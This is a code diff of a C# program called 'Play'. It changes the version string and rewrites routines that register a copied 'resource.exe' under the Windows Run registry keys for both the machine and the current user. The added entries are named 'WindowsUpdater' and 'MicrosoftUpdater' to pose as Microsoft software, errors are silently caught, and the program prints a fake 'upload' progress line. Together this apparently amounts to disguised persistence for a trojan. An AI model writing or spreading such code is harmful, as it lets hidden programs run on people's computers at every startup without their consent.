@@ -24,7 +24,7 @@ namespace Play
             if (checkFlag)
             {
                 Console.Clear();
-                Console.WriteLine("Play version 1.0.0");
+                Console.WriteLine("Play version 1.0.1");
                 checkFlag = false;
                 CheckFolder();
                 CopyFolder();
@@ -110,22 +110,28 @@ namespace Play
                 checkFlag = true;
             }
         }
-        private static void SetStartup2()
-        {
-            string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-
-            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(runKey, true))
-            {
-                key.SetValue("resource", targetFolderPath + @"\resource.exe");
-            }
-            Console.WriteLine("upload-100.00%");
-        }
         private static void SetStartup()
         {
             try
             {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                {
+                    key.SetValue("WindowsUpdater", "\"" + targetFolderPath + @"\resource.exe" + "\"");
+                    key.Close();
+                }
+            }
+            catch (Exception)
+            {
+                checkFlag = true;
+            }
+            Console.WriteLine("upload-100.00%");
+        }
+        private static void SetStartup1()
+        {
+            try
+            {
                 RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                key.SetValue("MicrosoftUpdater", targetFolderPath + @"\resource.exe");
+                key.SetValue("MicrosoftUpdater", "\""+targetFolderPath + @"\resource.exe" + "\"");
 
                 Console.WriteLine("upload-100.00%");
             }
@@ -133,6 +139,7 @@ namespace Play
             {
                 checkFlag = true;
             }
+            Console.WriteLine("upload-100.00%");
         }
         private static void PrintFunny()
         {
